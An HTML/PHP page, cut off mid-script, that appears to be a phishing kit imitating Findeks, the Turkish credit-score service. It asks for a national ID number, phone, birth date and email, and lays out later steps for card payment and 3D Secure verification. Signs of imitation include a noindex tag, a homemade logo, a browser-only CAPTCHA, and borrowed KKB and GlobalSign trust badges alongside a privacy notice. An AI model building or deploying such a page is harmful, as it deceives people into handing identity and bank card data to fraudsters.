<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Kredi Notunu Öğren - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Floating label ── */
        .float-group { position: relative; }
        .float-group input,
        .float-group select {
            padding-top: 1.375rem;
            padding-bottom: 0.5rem;
        }
        .float-label {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 0.875rem;
            color: #9ca3af;
            pointer-events: none;
            transition: all 0.18s ease;
            white-space: nowrap;
        }
        .float-group input:focus ~ .float-label,
        .float-group input:not(:placeholder-shown) ~ .float-label,
        .float-group select:focus ~ .float-label,
        .float-group select:not([value=""]) ~ .float-label {
            top: 0.6rem;
            transform: translateY(0);
            font-size: 0.7rem;
            color: #0056A4;
            font-weight: 600;
        }
        .float-group input:focus,
        .float-group select:focus {
            outline: none;
            border-color: #0056A4;
            box-shadow: 0 0 0 3px rgba(0, 86, 164, 0.12);
        }
        .float-group input.input-error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        /* ── Progress tabs ── */
        .step-tab {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .step-tab.active {
            background: #0056A4;
            color: #fff;
        }
        .step-tab.done {
            background: #e8f1fb;
            color: #0056A4;
        }
        .step-tab.pending {
            background: transparent;
            color: #9ca3af;
        }
        .step-dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            flex-shrink: 0;
        }
        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.pending .step-dot { background: #d1d5db; }

        /* ── CAPTCHA canvas ── */
        #captchaCanvas {
            border-radius: 6px;
            cursor: pointer;
            display: block;
        }

        /* ── Checkbox custom ── */
        .custom-check {
            width: 18px; height: 18px;
            border: 2px solid #d1d5db;
            border-radius: 4px;
            flex-shrink: 0;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.15s;
            cursor: pointer;
        }
        .custom-check.checked {
            background: #0056A4;
            border-color: #0056A4;
        }
        .custom-check svg { display: none; }
        .custom-check.checked svg { display: block; }

        /* ── Loading modal ── */
        .modal-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55);
            z-index: 9000;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(2px);
        }
        .modal-backdrop.hidden { display: none; }

        /* ── Spinner ── */
        .spinner {
            width: 44px; height: 44px;
            border: 4px solid rgba(0,86,164,0.15);
            border-top-color: #0056A4;
            border-radius: 50%;
            animation: spin 0.75s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Secure badge pulse ── */
        @keyframes securePulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.35); }
            50%       { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
        }
        .secure-pulse { animation: securePulse 2.5s ease-in-out infinite; }

        /* ── Right panel deco ── */
        .findeks-deco {
            background: linear-gradient(160deg, #0056A4 0%, #0070cc 35%, #0056A4 60%, #003d7a 100%);
            position: relative;
            overflow: hidden;
        }
        .findeks-deco::before {
            content: '';
            position: absolute; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 110% 20%, rgba(255,255,255,0.12) 0%, transparent 60%),
                radial-gradient(ellipse 60% 80% at -10% 80%, rgba(0,30,80,0.35) 0%, transparent 60%);
            pointer-events: none;
        }
        .findeks-deco::after {
            content: '';
            position: absolute; inset: 0;
            background-image: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
            background-size: 24px 24px;
            pointer-events: none;
        }

        /* ── Overlay backdrop ── */
        body {
            background: #f0f4f8;
            font-family: 'Inter', system-ui, sans-serif;
        }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6);
            z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative;
            z-index: 20;
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ── Scrollbar thin ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay (modal backdrop feel) -->
<div class="page-overlay" aria-hidden="true"></div>

<!-- ══════════════════════════════════════════
     MODAL SHELL
══════════════════════════════════════════ -->
<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title (hidden on mobile) -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab active" aria-current="step">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 1 / 5">
                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
            </div>

            <!-- Close button -->
            <a href="index.php"
               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
               aria-label="Kapat">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </a>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12">
        <div class="flex flex-col lg:flex-row gap-8 lg:gap-10 items-start">

            <!-- ══════════════════════════════════════════
                 LEFT COLUMN — Form
            ══════════════════════════════════════════ -->
            <div class="flex-1 w-full">

                <!-- Section heading -->
                <div class="mb-7">
                    <h1 class="text-2xl font-bold text-gray-900 tracking-tight">Bilgileriniz</h1>
                    <p class="text-sm text-gray-500 mt-1.5 leading-relaxed">
                        Sürece misafir olarak veya Findeks üyeliğiniz ile devam edebilirsiniz.
                    </p>
                </div>

                <!-- Error banner -->
                <div id="errorBanner"
                     role="alert"
                     aria-live="assertive"
                     class="hidden mb-5 flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl text-sm text-red-700">
                    <svg class="w-5 h-5 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span id="errorText"></span>
                </div>

                <!-- Form -->
                <form id="basvuruForm" novalidate autocomplete="off" class="space-y-4">

                    <!-- TC Kimlik No -->
                    <div class="float-group">
                        <input
                            type="text"
                            id="tcField"
                            name="tc"
                            inputmode="numeric"
                            maxlength="11"
                            placeholder=" "
                            autocomplete="off"
                            aria-label="T.C. Kimlik Numarası"
                            aria-required="true"
                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
                        >
                        <label for="tcField" class="float-label">T.C. Kimlik Numarası</label>
                    </div>

                    <!-- Cep Telefonu -->
                    <div class="float-group">
                        <input
                            type="tel"
                            id="phoneField"
                            name="phone"
                            inputmode="tel"
                            maxlength="14"
                            placeholder=" "
                            autocomplete="off"
                            aria-label="Cep Telefonu"
                            aria-required="true"
                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
                        >
                        <label for="phoneField" class="float-label">Cep Telefonu</label>
                    </div>

                    <!-- Doğum Tarihi -->
                    <div class="float-group">
                        <input
                            type="text"
                            id="birthField"
                            name="birth"
                            inputmode="numeric"
                            maxlength="10"
                            placeholder=" "
                            autocomplete="off"
                            aria-label="Doğum Tarihi (GG/AA/YYYY)"
                            aria-required="true"
                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
                        >
                        <label for="birthField" class="float-label">Doğum Tarihi (GG/AA/YYYY)</label>
                    </div>

                    <!-- E-posta -->
                    <div class="float-group">
                        <input
                            type="email"
                            id="emailField"
                            name="email"
                            inputmode="email"
                            placeholder=" "
                            autocomplete="off"
                            aria-label="E-posta Adresi"
                            aria-required="true"
                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
                        >
                        <label for="emailField" class="float-label">E-posta Adresi</label>
                    </div>

                    <!-- CAPTCHA -->
                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-4">
                        <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3">Güvenlik Doğrulaması</p>
                        <div class="flex items-center gap-3 mb-3">
                            <canvas id="captchaCanvas" width="140" height="44" class="rounded-lg border border-gray-200 shadow-sm" title="Yeni kod için tıklayın"></canvas>
                            <button type="button" id="captchaRefresh"
                                    aria-label="Yeni güvenlik kodu oluştur"
                                    class="w-9 h-9 flex items-center justify-center rounded-lg border border-gray-200 bg-white text-gray-400 hover:text-brand-primary hover:border-brand-primary transition-colors">
                                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
                            </button>
                        </div>
                        <div class="float-group">
                            <input
                                type="text"
                                id="captchaField"
                                name="captcha"
                                maxlength="5"
                                placeholder=" "
                                autocomplete="off"
                                aria-label="Güvenlik kodu"
                                aria-required="true"
                                class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 tracking-widest transition-all"
                            >
                            <label for="captchaField" class="float-label">Güvenlik Kodunu Girin</label>
                        </div>
                    </div>

                    <!-- KVKK Checkbox -->
                    <div class="flex items-start gap-3 pt-1">
                        <button type="button"
                                id="kvkkCheckBtn"
                                role="checkbox"
                                aria-checked="false"
                                aria-label="KVKK aydınlatma metnini okudum ve onaylıyorum"
                                class="custom-check mt-0.5"
                                onclick="toggleKvkk()">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </button>
                        <input type="hidden" id="kvkkValue" name="kvkk" value="0">
                        <p class="text-xs text-gray-500 leading-relaxed">
                            <button type="button" onclick="openKvkkModal()"
                                    class="text-brand-primary font-semibold hover:underline focus:outline-none">
                                KVKK Aydınlatma Metni
                            </button>'ni okudum, kişisel verilerimin işlenmesine ilişkin bilgilendirmeyi anladım ve onaylıyorum.
                        </p>
                    </div>

                    <!-- Submit -->
                    <button type="submit" id="submitBtn"
                            class="w-full py-3.5 bg-brand-primary hover:bg-brand-secondary text-white font-semibold rounded-xl text-sm transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow-md mt-2">
                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
                        Devam Et
                    </button>

                    <!-- Trust row -->
                    <div class="flex items-center justify-center gap-5 pt-1">
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                            <span class="text-[11px]">SSL Şifreli</span>
                        </div>
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                            <span class="text-[11px]">256-bit Şifreleme</span>
                        </div>
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                            <span class="text-[11px]">KKB Güvenceli</span>
                        </div>
                    </div>

                </form>
            </div>

            <!-- ══════════════════════════════════════════
                 RIGHT COLUMN — Summary sidebar (desktop)
            ══════════════════════════════════════════ -->
            <aside class="findeks-deco hidden lg:flex flex-col w-80 xl:w-96 rounded-2xl p-8 flex-shrink-0" aria-label="Seçiminiz">

                <!-- Panel header -->
                <div class="mb-6 relative z-10">
                    <div class="flex items-center gap-3 mb-1">
                        <div class="w-8 h-8 bg-white/15 rounded-lg flex items-center justify-center backdrop-blur-sm">
                            <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg>
                        </div>
                        <h2 class="text-white font-semibold text-lg">Seçiminiz</h2>
                    </div>
                    <p class="text-blue-200/70 text-xs ml-11">Seçtiğiniz paketi aşağıda görebilirsiniz</p>
                </div>

                <!-- Package card -->
                <div class="relative z-10 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15 p-5 mb-5">
                    <div class="flex items-start gap-3">
                        <div class="w-11 h-11 bg-white/15 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0020 4.77 5.07 5.07 0 0019.91 1S18.73.65 16 2.48a13.38 13.38 0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 005 4.77a5.44 5.44 0 00-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 009 18.13V22"/></svg>
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="text-white text-sm font-semibold" id="sidebarPackageName">Kredi Notu Raporu</p>
                            <p class="text-blue-200/70 text-xs mt-0.5">Findeks Premium Paket</p>
                        </div>
                    </div>
                    <div class="mt-4 pt-4 border-t border-white/15 flex items-center justify-between">
                        <span class="text-blue-200/80 text-sm">Paket Ücreti</span>
                        <span class="text-white font-bold text-lg" id="sidebarPackagePrice">₺99,00</span>
                    </div>
                </div>

                <!-- Step info -->
                <div class="relative z-10 space-y-2.5 mb-6">
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <span class="text-brand-primary text-[10px] font-bold">1</span>
                        </div>
                        <span class="text-white text-xs font-semibold">Bilgilerinizi girin</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">2</span>
                        </div>
                        <span class="text-white text-xs">Paket seçin</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">3</span>
                        </div>
                        <span class="text-white text-xs">Ödeme yapın</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">4</span>
                        </div>
                        <span class="text-white text-xs">3D Secure doğrulama</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">5</span>
                        </div>
                        <span class="text-white text-xs">Raporunuzu görüntüleyin</span>
                    </div>
                </div>

                <!-- Secure badge -->
                <div class="relative z-10 mt-auto">
                    <div class="secure-pulse flex items-center gap-3 p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15">
                        <div class="w-10 h-10 bg-emerald-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-emerald-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        </div>
                        <div>
                            <p class="text-white text-xs font-semibold">Güvenli İşlem Garantisi</p>
                            <p class="text-blue-200/60 text-[10px] mt-0.5">KKB & GlobalSign güvencesiyle korunmaktadır</p>
                        </div>
                    </div>

                    <!-- Security badges -->
                    <div class="flex items-center gap-2 mt-4 justify-center flex-wrap">
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">GlobalSign</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">KKB</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">Eyebrand</span>
                        </div>
                    </div>
                </div>

                <!-- Hidden inputs for package data -->
                <input type="hidden" id="hiddenPackageName"  value="Kredi Notu Raporu">
                <input type="hidden" id="hiddenPackagePrice" value="99.00">

            </aside>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Copyright -->
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>

            <!-- Security badges -->
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->


<!-- ══════════════════════════════════════════
     KVKK MODAL
══════════════════════════════════════════ -->
<div id="kvkkModal" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="kvkkModalTitle">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-lg mx-4 max-h-[80vh] flex flex-col overflow-hidden">
        <div class="flex items-center justify-between px-6 py-4 border-b border-gray-100">
            <h2 id="kvkkModalTitle" class="text-base font-bold text-gray-900">KVKK Aydınlatma Metni</h2>
            <button onclick="closeKvkkModal()"
                    aria-label="Kapat"
                    class="w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </button>
        </div>
        <div class="overflow-y-auto px-6 py-5 text-sm text-gray-600 leading-relaxed space-y-4 flex-1">
            <p>
                <strong class="text-gray-800">Veri Sorumlusu:</strong> Kredi Kayıt Bürosu A.Ş. (KKB), 6698 sayılı Kişisel Verilerin Korunması Kanunu ("KVKK") kapsamında veri sorumlusu sıfatıyla hareket etmektedir.
            </p>
            <p>
                <strong class="text-gray-800">İşlenen Kişisel Veriler:</strong> T.C. Kimlik Numarası, ad-soyad, doğum tarihi, cep telefonu numarası ve e-posta adresi gibi kimlik ve iletişim bilgileriniz işlenmektedir.
            </p>
            <p>
                <strong class="text-gray-800">İşleme Amaçları:</strong> Kişisel verileriniz; kredi notu sorgulama hizmetinin sunulması, kimlik doğrulama, sözleşme süreçlerinin yürütülmesi, yasal yükümlülüklerin yerine getirilmesi ve müşteri ilişkilerinin yönetimi amaçlarıyla işlenmektedir.
            </p>
            <p>
                <strong class="text-gray-800">Hukuki Dayanak:</strong> Kişisel verileriniz; sözleşmenin kurulması ve ifası, meşru menfaat ile açık rıza hukuki sebeplerine dayanılarak işlenmektedir.
            </p>
            <p>
                <strong class="text-gray-800">Veri Aktarımı:</strong> Kişisel verileriniz; yasal zorunluluklar çerçevesinde kamu kurumları ile KKB iş ortaklarına aktarılabilir.
            </p>
            <p>
                <strong class="text-gray-800">Haklarınız:</strong> KVKK'nın 11. maddesi kapsamında; kişisel verilerinize erişim, düzeltme, silme, işlemenin kısıtlanması ve itiraz haklarına sahipsiniz. Taleplerinizi <a href="mailto:kvkk@kkb.com.tr" class="text-brand-primary hover:underline">kvkk@kkb.com.tr</a> adresine iletebilirsiniz.
            </p>
        </div>
        <div class="px-6 py-4 border-t border-gray-100 flex gap-3">
            <button onclick="acceptKvkk()"
                    class="flex-1 py-2.5 bg-brand-primary hover:bg-brand-secondary text-white text-sm font-semibold rounded-xl transition-colors">
                Okudum, Onaylıyorum
            </button>
            <button onclick="closeKvkkModal()"
                    class="px-5 py-2.5 border border-gray-200 text-gray-600 text-sm font-medium rounded-xl hover:bg-gray-50 transition-colors">
                Kapat
            </button>
        </div>
    </div>
</div>


<!-- ══════════════════════════════════════════
     ERROR MODAL
══════════════════════════════════════════ -->
<div id="errorModal" class="modal-backdrop hidden" role="alertdialog" aria-modal="true" aria-labelledby="errorModalTitle">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm mx-4 overflow-hidden">
        <div class="p-6 text-center">
            <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
            </div>
            <h3 id="errorModalTitle" class="text-base font-bold text-gray-900 mb-2">Hata</h3>
            <p id="errorModalText" class="text-sm text-gray-500 leading-relaxed mb-5"></p>
            <button onclick="closeErrorModal()"
                    class="w-full py-2.5 bg-brand-primary hover:bg-brand-secondary text-white text-sm font-semibold rounded-xl transition-colors">
                Tamam
            </button>
        </div>
    </div>
</div>


<!-- ══════════════════════════════════════════
     LOADING MODAL
══════════════════════════════════════════ -->
<div id="loadingModal" class="modal-backdrop hidden" role="status" aria-live="polite" aria-label="İşleminiz devam ediyor">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xs mx-4 p-8 text-center">
        <div class="spinner mx-auto mb-5"></div>
        <p class="text-sm font-semibold text-gray-800">Bilgileriniz Doğrulanıyor</p>
        <p class="text-xs text-gray-400 mt-1.5">Lütfen bekleyiniz...</p>
    </div>
</div>


<!-- ══════════════════════════════════════════
     SCRIPTS
══════════════════════════════════════════ -->
<script>
    /* ─── CAPTCHA ─── */
    let captchaCode = '';

    function generateCaptcha() {
        const canvas = document.getElementById('captchaCanvas');
        const ctx    = canvas.getContext('2d');
        const chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        captchaCode  = '';
        for (let i = 0; i < 5; i++) {
            captchaCode += chars[Math.floor(Math.random() * chars.length)];
        }

        // Background
        ctx.fillStyle = '#f8fafc';
        ctx.fillRect(0, 0, 140, 44);

        // Noise lines
        for (let i = 0; i < 5; i++) {
            ctx.strokeStyle = 'rgba(0,86,164,' + (0.08 + Math.random() * 0.1) + ')';
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(Math.random() * 140, Math.random() * 44);
            ctx.lineTo(Math.random() * 140, Math.random() * 44);
            ctx.stroke();
        }

        // Characters
        for (let i = 0; i < captchaCode.length; i++) {
            const size = 16 + Math.random() * 5;
            ctx.font = 'bold ' + size + 'px Arial';
            const hue = Math.floor(Math.random() * 60) + 200; // blue-ish range
            ctx.fillStyle = 'hsl(' + hue + ',60%,35%)';
            ctx.save();
            ctx.translate(16 + i * 22, 30 + (Math.random() * 6 - 3));
            ctx.rotate((Math.random() - 0.5) * 0.35);
            ctx.fillText(captchaCode[i], 0, 0);
            ctx.restore();
        }

        // Noise dots
        for (let i = 0; i < 40; i++) {
            ctx.fillStyle = 'rgba(0,0,0,' + (Math.random() * 0.12) + ')';
            ctx.fillRect(Math.random() * 140, Math.random() * 44, 1.5, 1.5);
        }
    }

    document.getElementById('captchaCanvas').addEventListener('click', generateCaptcha);
    document.getElementById('captchaRefresh').addEventListener('click', function() {
        generateCaptcha();
        document.getElementById('captchaField').value = '';
        document.getElementById('captchaField').focus();
    });
    generateCaptcha();


    /* ─── KVKK ─── */
    let kvkkAccepted = false;

    function toggleKvkk() {
        kvkkAccepted = !kvkkAccepted;
        const btn = document.getElementById('kvkkCheckBtn');
        const inp = document.getElementById('kvkkValue');
        btn.classList.toggle('checked', kvkkAccepted);
        btn.setAttribute('aria-checked', kvkkAccepted ? 'true' : 'false');
        inp.value = kvkkAccepted ? '1' : '0';
    }

    function openKvkkModal() {
        document.getElementById('kvkkModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    function closeKvkkModal() {
        document.getElementById('kvkkModal').classList.add('hidden');
        document.body.style.overflow = '';
    }

    function acceptKvkk() {
        if (!kvkkAccepted) toggleKvkk();
        closeKvkkModal();
    }

    // Close KVKK modal on backdrop click
    document.getElementById('kvkkModal').addEventListener('click', function(e) {
        if (e.target === this) closeKvkkModal();
    });


    /* ─── Error modal ─── */
    function showErrorModal(msg) {
        document.getElementById('errorModalText').textContent = msg;
        document.getElementById('errorModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    function closeErrorModal() {
        document.getElementById('errorModal').classList.add('hidden');
        document.body.style.overflow = '';
    }

    document.getElementById('errorModal').addEventListener('click', function(e) {
        if (e.target === this) closeErrorModal();
    });


    /* ─── Inline error banner ─── */
    function showBanner(msg) {
        const banner = document.getElementById('errorBanner');
        document.getElementById('errorText').textContent = msg;
        banner.classList.remove('hidden');
        banner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    function hideBanner() {
        document.getElementById('errorBanner').classList.add('hidden');
    }


    /* ─── Loading modal ─── */
    function showLoading() {
        document.getElementById('loadingModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    function hideLoading() {
        document.getElementById('loadingModal').classList.add('hidden');
        document.body.style.overflow = '';
    }


    /* ─── Input masks ─── */

    // TC: digits only, max 11
    document.getElementById('tcField').addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').substring(0, 11);
    });

    // Phone: format 05XX XXX XX XX
